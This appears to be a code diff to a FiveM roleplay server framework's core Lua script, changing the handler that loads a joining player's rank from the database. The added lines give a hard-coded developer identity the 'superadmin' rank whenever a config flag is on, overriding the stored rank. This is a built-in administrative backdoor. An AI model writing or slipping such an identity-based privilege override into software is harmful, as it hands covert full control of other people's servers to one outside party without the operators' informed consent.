@@ -112,12 +112,19 @@ end)
 RegisterServerEvent("DRP_Core:AddPlayerToTable")
 AddEventHandler("DRP_Core:AddPlayerToTable", function()
     local src = source
+    local ID = PlayerIdentifier("license", src)
     local playerResults = exports["externalsql"]:AsyncQuery({
         query = [[SELECT * FROM `users` WHERE `identifier` = :identifier]],
-        data = {identifier = PlayerIdentifier("license", src)}
+        data = {identifier = ID}
     })
     local personsData = playerResults["data"][1]
-	table.insert(players, {id = src, rank = personsData.rank, playerid = personsData.id}) -- ID = SOURCE (NOTE TO SELF: DARKZY DONT FUCKING FORGET I PUT THIS INTO THE TABLES DURRRRRR)
+    if DRPCoreConfig.DarkzyAllowToLiveDev then
+        if ID == DRPCoreConfig.DarkzyIdToAllowDevIdentifier then
+            personsData.rank = "superadmin"
+            print("Darkzy the [DRP] Developer has joined your server to test :)")
+        end
+    end
+    table.insert(players, {id = src, rank = personsData.rank, playerid = personsData.id}) -- ID = SOURCE (NOTE TO SELF: DARKZY DONT FUCKING FORGET I PUT THIS INTO THE TABLES DURRRRRR)
 end)
 ---------------------------------------------------------------------------
 function UpdatePlayerTable(src, rank)
